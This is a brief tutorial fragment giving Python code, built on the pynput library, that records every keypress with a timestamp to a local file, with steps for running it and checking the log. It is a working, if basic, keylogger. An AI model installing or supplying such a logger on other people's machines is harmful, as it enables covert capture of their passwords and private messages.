from pynput.keyboard import Key, Listener
import logging
# if no name it gets into an empty string
log_dir = ""
# This is a basic logging function
logging.basicConfig(filename=(log_dir+"my_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s:')
# This is from the library
def on_press(key):
	logging.info(str(key))
# This says, listener is on
with Listener(on_press=on_press) as listener:
	listener.join()
 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
(4)Run your program and type some text on the ouput console
 
(5)Search for the text file name my_log in your python folder which you have created . you will be able to see the see the record of each and every key which is being pressed along with the date and time
